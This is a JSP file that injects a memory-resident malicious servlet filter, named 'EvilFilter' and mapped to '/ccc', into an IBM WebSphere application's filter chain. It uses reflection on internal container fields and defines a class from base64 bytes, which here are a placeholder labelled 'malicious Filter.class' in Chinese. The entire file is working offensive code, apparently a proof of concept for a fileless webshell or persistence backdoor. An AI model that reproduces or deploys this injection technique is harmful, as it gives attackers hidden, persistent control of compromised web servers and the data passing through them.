<%@ page import="com.ibm.ws.managedobject.ManagedObject" %>
<%@ page import="com.ibm.ws.managedobject.ManagedObjectContext" %>
<%@ page import="com.ibm.ws.webcontainer.filter.FilterConfig" %>
<%@ page import="com.ibm.ws.webcontainer.filter.FilterInstanceWrapper" %>
<%@ page import="com.ibm.ws.webcontainer.filter.WebAppFilterManagerImpl" %>
<%@ page import="com.ibm.ws.webcontainer.srt.SRTServletRequest" %>
<%@ page import="com.ibm.ws.webcontainer.webapp.WebAppEventSource" %>
<%@ page import="com.ibm.ws.webcontainer.webapp.WebAppImpl" %>
<%@ page import="com.ibm.wsspi.webcontainer.webapp.WebAppConfig" %>

<%@ page import="sun.misc.BASE64Decoder" %>

<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.http.HttpServlet" %>
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>

<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.*" %>

<%!
private static String filterName = "EvilFilter";
private static String filterClassName = "EvilFilter";
private static String url = "/ccc";
private static SRTServletRequest currentThreadsIExtendedRequest = null;
private static WebAppImpl context;
private static WebAppFilterManagerImpl filterManager= null;
private static Map<String, Object> chainCache = null;
private static Hashtable<String, FilterInstanceWrapper> _filterWrappers;

private static synchronized void LoadFilter() throws Exception {
    try{
        Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();
    }catch (Exception e){
        Method a = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        a.setAccessible(true);
        byte[] b = (new BASE64Decoder()).decodeBuffer("恶意Filter.class | base64");
        a.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length);
    }
}

private static synchronized void GetWebContent() throws Exception{
    try {
        Object[] wsThreadLocals = (Object[]) GetField(Thread.currentThread(),"wsThreadLocals");
        for (int i = 0; i < wsThreadLocals.length; i++) {
            if(wsThreadLocals[i] != null &&wsThreadLocals[i].getClass().getName().contains("WebContainerRequestState") ){
                currentThreadsIExtendedRequest = (SRTServletRequest) GetField(wsThreadLocals[i],"currentThreadsIExtendedRequest");
            }
        }
        ServletContext servletContext = currentThreadsIExtendedRequest.getServletContext();
        System.out.println("Step 1");

        context = (WebAppImpl)GetField(servletContext,"context");
    }catch (Exception e){
        e.printStackTrace();
    }
}

private static synchronized Object GetField(Object o, String k) throws Exception{
    Field f;
    try {
        f = o.getClass().getDeclaredField(k);
    } catch (NoSuchFieldException e) {
        try{
            f = o.getClass().getSuperclass().getDeclaredField(k);
        }catch (Exception e1){
            f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);
        }
    }
    f.setAccessible(true);
    return f.get(o);
}

private static synchronized void InjectFilter() throws Exception {
    try {
        if(context!=null){
            filterManager = (WebAppFilterManagerImpl) GetField(context,"filterManager");

            chainCache = (Map<String, Object>) GetField(filterManager,"chainCache");
            Constructor constructor = Class.forName("com.ibm.ws.webcontainer.filter.FilterChainContents").getDeclaredConstructor();
            constructor.setAccessible(true);
            Object filterChainContents = constructor.newInstance();

            //Step1
            ArrayList _filterNames= (ArrayList) GetField(filterChainContents,"_filterNames");
            _filterNames.add(filterName);
            SetField(filterChainContents,"_hasFilters",true);
            chainCache.put(url,filterChainContents);

            //Step2
            _filterWrappers = (Hashtable<String, FilterInstanceWrapper>) GetField(filterManager,"_filterWrappers");
            javax.servlet.Filter filter =  (Filter) Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();
            WebAppEventSource _evtSource = (WebAppEventSource) GetField(filterManager,"_evtSource");

            ManagedObject filterMo = context.createManagedObject(filter);
            FilterInstanceWrapper filterInstanceWrapper = new FilterInstanceWrapper(filterName,filterMo,_evtSource);

            SetField(filterInstanceWrapper,"_filterState",2);

            Object webAppConfig = GetField(filterManager,"webAppConfig");
            FilterConfig filterConfig = new FilterConfig(filterName,(WebAppConfig) webAppConfig);

            HashSet<DispatcherType> set = new HashSet();
            set.add(DispatcherType.REQUEST);
            filterConfig.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST),true,url);

            SetField(filterInstanceWrapper,"_filterConfig",filterConfig);

            _filterWrappers.put(filterName,filterInstanceWrapper);

            SetField(filterManager,"_filtersDefined",true);
            System.out.println("123");

        }
    }catch (Exception e){
        e.printStackTrace();
    }
}

private static synchronized void SetField(Object o, String k,Object v) throws Exception{
    Field f;
    try{
        f = o.getClass().getDeclaredField(k);
    }catch (NoSuchFieldException e){
        f = o.getClass().getSuperclass().getDeclaredField(k);
    }catch (Exception e1){
        f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);
    }
    f.setAccessible(true);
    f.set(o,v);
}
%>

<%
out.println("*********************************AwesomeScriptEngineFactory()*********************************");
try {
    out.println("*********************************LoadFilter()*********************************");
    LoadFilter();
    out.println("*********************************GetWebContent()*********************************");
    GetWebContent();
    out.println("*********************************InjectFilter()*********************************");
    InjectFilter();
    out.println("*********************************InjectFilter Success()*********************************");
} catch (Exception e) {
    e.printStackTrace();
    out.println(e);
}

%>
